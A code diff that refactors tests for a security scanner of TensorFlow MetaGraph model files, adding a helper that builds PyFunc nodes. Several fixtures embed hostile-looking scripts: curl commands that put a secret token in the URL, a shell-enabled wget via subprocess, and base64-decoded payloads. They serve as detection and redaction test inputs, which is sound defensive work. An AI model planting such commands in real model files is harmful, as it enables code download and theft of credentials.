@@ -30,6 +30,7 @@ from modelaudit.scanners.tf_metagraph_scanner import (
 )
 from modelaudit.utils.helpers import cache_decorator
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
+from tests.cache_lifecycle import IsolatedCacheManager
 
 pytestmark = pytest.mark.skipif(not _has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 
@@ -114,6 +115,11 @@ def _build_metagraph(
                 collection.bytes_list.value.append(value)
 
     return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_pyfunc_metagraph(node_name: str, attrs: dict[str, object]) -> bytes:
+    """Build one named PyFunc node while keeping its attributes intact."""
+    return _build_metagraph(graph_nodes=[{"name": node_name, "op": "PyFunc", "attrs": attrs}])
 
 
 def _assert_metagraph_read_failure_metadata(metadata: Any) -> None:
@@ -259,8 +265,7 @@ def test_tf_metagraph_read_failure_result_is_not_cached(
 
     monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", raise_read_error)
 
-    reset_cache_manager()
-    try:
+    with IsolatedCacheManager(lambda: reset_cache_manager()):
         first = scan_model_directory_or_file(
             str(unreadable_meta),
             cache_enabled=True,
@@ -278,8 +283,6 @@ def test_tf_metagraph_read_failure_result_is_not_cached(
             _assert_metagraph_read_failure_metadata(aggregate.file_metadata[str(unreadable_meta)])
             assert determine_exit_code(aggregate) == 2
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
-    finally:
-        reset_cache_manager()
 
 
 def test_tf_metagraph_single_file_scan_bypasses_stale_cache_when_read_fails(
@@ -290,8 +293,7 @@ def test_tf_metagraph_single_file_scan_bypasses_stale_cache_when_read_fails(
     cached_clean.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))
     cache_dir = tmp_path / "cache"
 
-    reset_cache_manager()
-    try:
+    with IsolatedCacheManager(lambda: reset_cache_manager()):
         with monkeypatch.context() as cache_setup:
             cache_setup.setattr(
                 cache_decorator,
@@ -321,8 +323,6 @@ def test_tf_metagraph_single_file_scan_bypasses_stale_cache_when_read_fails(
         _assert_metagraph_read_failure_metadata(metadata)
         assert determine_exit_code(second) == 2
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
-    finally:
-        reset_cache_manager()
 
 
 def test_tf_metagraph_directory_scan_bypasses_stale_cache_when_read_fails_with_security_finding(
@@ -337,8 +337,7 @@ def test_tf_metagraph_directory_scan_bypasses_stale_cache_when_read_fails_with_s
     malicious_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "payload", "op": "PyFunc"}]))
     cache_dir = tmp_path / "cache"
 
-    reset_cache_manager()
-    try:
+    with IsolatedCacheManager(lambda: reset_cache_manager()):
         with monkeypatch.context() as cache_setup:
             cache_setup.setattr(
                 cache_decorator,
@@ -366,8 +365,6 @@ def test_tf_metagraph_directory_scan_bypasses_stale_cache_when_read_fails_with_s
         _assert_metagraph_read_failure_metadata(result.file_metadata[str(cached_clean)])
         assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
         assert determine_exit_code(result) == 2
-    finally:
-        reset_cache_manager()
 
 
 def test_tf_metagraph_unreadable_path_preflight_is_operational_not_security_finding(
@@ -597,14 +594,9 @@ def test_tf_metagraph_scanner_redacts_secret_after_encoded_url_path(tmp_path: Pa
     sensitive_url = f"https://example.com/{'A' * 160}/{project_key}/model.so"
     sensitive_meta = tmp_path / "encoded-path-preview.meta"
     sensitive_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": f"curl {sensitive_url}"},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "pyfunc_node",
+            {"script": f"curl {sensitive_url}"},
         )
     )
 
@@ -667,25 +659,15 @@ def test_tf_metagraph_scanner_flags_urlsafe_encoded_payloads_without_near_match_
     suspicious_meta = tmp_path / "urlsafe-encoded.meta"
     benign_meta = tmp_path / "urlsafe-near-match.meta"
     suspicious_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "encoded_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": f"base64.b64decode('{encoded_payload}')"},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "encoded_node",
+            {"script": f"base64.b64decode('{encoded_payload}')"},
         )
     )
     benign_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "near_match_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": f"base64.b64decode('{near_match}')"},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "near_match_node",
+            {"script": f"base64.b64decode('{near_match}')"},
         )
     )
 
@@ -731,14 +713,9 @@ def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: 
     public_context = f"subprocess.run('wget {public_url}', shell=True) markers ghp_short sk-proj-example"
     public_meta = tmp_path / "public-preview.meta"
     public_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": public_context},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "pyfunc_node",
+            {"script": public_context},
         )
     )
 
@@ -978,14 +955,9 @@ def test_tf_metagraph_scanner_handles_unicode_tokenizer_errors(tmp_path: Path) -
     secret = "REAL_METAGRAPH_UNICODE_SECRET"
     unicode_meta = tmp_path / "unicode-tokenizer-error.meta"
     unicode_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "unicode_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": f"curl https://example.com/?token={secret}\rو"},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "unicode_node",
+            {"script": f"curl https://example.com/?token={secret}\rو"},
         )
     )
 
@@ -1014,14 +986,9 @@ def test_tf_metagraph_scanner_handles_unicode_tokenizer_errors(tmp_path: Path) -
 def test_tf_metagraph_scanner_redacts_standalone_secret_tokens(tmp_path: Path, secret: str) -> None:
     malicious_meta = tmp_path / "standalone-secret.meta"
     malicious_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": f"python -c 'print(1)' {secret}"},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "pyfunc_node",
+            {"script": f"python -c 'print(1)' {secret}"},
         )
     )
 
@@ -1041,14 +1008,9 @@ def test_tf_metagraph_scanner_redacts_r_access_identifier_assignments(tmp_path: 
     )
     malicious_meta = tmp_path / "r-access-identifiers.meta"
     malicious_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": script},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "pyfunc_node",
+            {"script": script},
         )
     )
 
@@ -1077,14 +1039,9 @@ def test_tf_metagraph_scanner_preserves_standalone_secret_near_matches(tmp_path:
     public_context = f"python -c 'print(1)' {near_match}"
     public_meta = tmp_path / "standalone-secret-near-match.meta"
     public_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {"script": public_context},
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "pyfunc_node",
+            {"script": public_context},
         )
     )
 
@@ -1252,18 +1209,13 @@ def test_tf_metagraph_scanner_detects_split_encoded_payload_and_oversized_attrs(
     suspicious_meta = tmp_path / "split-payload.meta"
     encoded_blob = "A" * 192
     suspicious_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {
-                        "decoder": "base64.b64decode",
-                        "payload": encoded_blob,
-                        "script": "A" * (_MAX_ATTR_VALUE_BYTES + 512),
-                    },
-                }
-            ]
+        _build_pyfunc_metagraph(
+            "pyfunc_node",
+            {
+                "decoder": "base64.b64decode",
+                "payload": encoded_blob,
+                "script": "A" * (_MAX_ATTR_VALUE_BYTES + 512),
+            },
         )
     )
 
